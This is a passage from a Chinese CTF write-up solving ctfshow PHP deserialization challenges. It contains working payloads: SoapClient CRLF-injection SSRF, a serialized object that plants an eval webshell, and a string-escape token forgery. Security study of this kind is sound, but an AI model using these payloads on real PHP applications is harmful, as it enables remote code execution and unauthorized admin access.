namespace\">ns1:</span>getflag</span><span class=\"token punctuation\">/></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span><span class=\"token namespace\">SOAP-ENV:</span>Body</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span><span class=\"token namespace\">SOAP-ENV:</span>Envelope</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>最终构造payload如下</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">//token=ctfshow</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$ua</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"K1nako\\r\\nx-forwarded-for:127.0.0.1,127.0.0.1,127.0.0.1\\r\\nContent-Type:application/x-www-form-urlencoded\\r\\nContent-Length:13\\r\\n\\r\\ntoken=ctfshow\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token variable\">$client</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">SoapClient</span><span class=\"token punctuation\">(</span><span class=\"token constant\">null</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'uri'</span><span class=\"token operator\">=></span><span class=\"token string single-quoted-string\">'http://127.0.0.1/'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'location'</span><span class=\"token operator\">=></span><span class=\"token string single-quoted-string\">'http://127.0.0.1/flag.php'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'user_agent'</span><span class=\"token operator\">=></span><span class=\"token variable\">$ua</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">//$client->getflag();</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$client</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><pre><code>ctfshow&#123;4ee6966f-f129-4019-bf80-76aaebe2ed23&#125;\n</code></pre>\n<h2 id=\"web260\"><a class=\"anchor\" href=\"#web260\">#</a> web260</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/ctfshow_i_love_36D/'</span><span class=\"token punctuation\">,</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'ctfshow'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">?</span>ctfshow<span class=\"token operator\">=</span>ctfshow_i_love_36D</pre></td></tr></table></figure><pre><code>ctfshow&#123;5bb8fa71-ba31-4453-b382-ea93289a2672&#125;\n</code></pre>\n<h2 id=\"web261\"><a class=\"anchor\" href=\"#web261\">#</a> web261</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">ctfshowvip</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$code</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$u</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span><span class=\"token operator\">=</span><span class=\"token variable\">$u</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token operator\">=</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span><span class=\"token operator\">!=</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">||</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token operator\">!=</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'error'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__invoke</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__sleep</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span><span class=\"token operator\">=</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token operator\">=</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">code</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span><span class=\"token operator\">.</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">code</span><span class=\"token operator\">==</span><span class=\"token number\">0x36d</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>            <span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'vip'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>if($this->code==0x36d)的0x36d没有引号说明是整型，36d转十进制是877，所以只需要a=877.php,b写一句话木马连接即可</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>构造payload：</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">ctfshowvip</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$code</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$u</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'877.php'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$p</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'&lt;?php eval($_POST[K1nako]);?>'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span><span class=\"token operator\">=</span><span class=\"token variable\">$u</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token operator\">=</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> </pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ctfshowvip</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$str</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><pre><code>传入vip的序列化值后访问877.php然后连接即可\n</code></pre>\n<p><img data-src=\"C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230204163609509.png\" alt=\"image-20230204163609509\" /></p>\n<pre><code>ctfshow&#123;42c743fe-fdb8-4c93-8e10-df905d5c28aa&#125;\n</code></pre>\n<h2 id=\"web262\"><a class=\"anchor\" href=\"#web262\">#</a> web262</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-12-03 02:37:19</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-12-03 16:05:38</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @message.php</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">message</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$from</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$msg</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$to</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$token</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$m</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$t</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">from</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$f</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">msg</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$m</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">to</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$t</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token variable\">$f</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'f'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token variable\">$m</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'m'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token variable\">$t</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'t'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$m</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$t</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">message</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$m</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$t</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token variable\">$umsg</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'fuck'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'loveU'</span><span class=\"token punctuation\">,</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$msg</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token function\">setcookie</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">,</span><span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$umsg</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'Your message has been sent'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">message</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$from</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$msg</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$to</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$token</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$m</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$t</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">from</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$f</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">msg</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$m</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">to</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$t</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    <span class=\"token variable\">$msg</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$msg</span><span class=\"token operator\">-></span><span class=\"token property\">token</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>反序列化字符串逃逸</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>我们需要将token=admin，s:5:\"token\";s:5:\"admin\"</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>目前只有from、msg、to是可控的</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>假如我们向to属性传递t=3\";s:5:\"token\";s:5:\"admin\";&#125;我们就可以将字符串进行闭合就能控制token的值，然后发现to的长度变成了27</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>$umsg = str_replace('fuck', 'loveU', serialize($msg));</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>利用替换函数fuck替换成loveU这样就会增加一个字符串</pre></td></tr><tr><td 